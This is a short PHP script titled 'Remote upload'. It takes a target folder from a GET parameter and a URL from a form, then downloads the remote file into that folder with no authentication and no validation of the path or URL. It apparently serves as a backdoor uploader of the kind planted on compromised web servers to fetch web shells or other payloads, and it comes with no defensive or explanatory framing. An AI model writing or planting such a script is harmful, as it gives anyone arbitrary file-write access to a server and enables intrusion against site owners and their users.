<?php

$path = $_GET['i'];
?>

<title>Remote upload</title>
<center>
</br</p></br</p><form method="post">
<input name="url" size="50" />
<input name="submit" type="submit" />
</form>

<?php

set_time_limit (24 * 60 * 60);
if (!isset($_POST['submit'])) die();
$destination_folder = $path."/";

$url = $_POST['url'];
$newfname = $destination_folder . basename($url);
echo $newfname;
$file = fopen ($url, "rb");
if ($file) {
  $newf = fopen ($newfname, "wb");
  if ($newf)
  while(!feof($file)) {
    fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
  }
}
if ($file) {fclose($file);}
if ($newf) {fclose($newf);}

?>
</center>
